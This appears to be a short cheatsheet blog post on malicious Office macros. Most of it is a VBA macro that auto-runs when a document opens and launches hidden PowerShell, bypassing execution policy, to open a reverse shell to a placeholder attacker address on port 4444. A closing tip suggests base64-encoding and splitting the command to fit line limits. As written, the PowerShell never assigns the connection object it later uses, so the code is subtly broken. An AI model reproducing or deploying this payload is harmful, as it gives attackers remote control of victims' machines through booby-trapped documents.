---
layout: post
title: "Malicious Macros in Office"
date: 2024-06-09
categories: [CHEATSHEET]
---


Below is an example of a VBA macro designed to open a reverse shell on a Windows system:

  
```shell
Sub AutoOpen()
    OpenReverseShell
End Sub

Sub OpenReverseShell()
    Dim strShellPath As String
    strShellPath = "cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('attacker_ip',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    Shell strShellPath
End Sub
```

  
> ***Note***:
>
> VBA supports a maximum string length of about 2 billion characters, which is typically more than sufficient for most macro scripts. However, the practical limits for a single line of code or string literals in VBA are much lower, usually around 1024 characters. This limit can impact the way scripts are written, particularly when embedding long shell commands or scripts directly into the VBA code; A workaround could be to base64 encode the command and concatenate it across multiple lines.

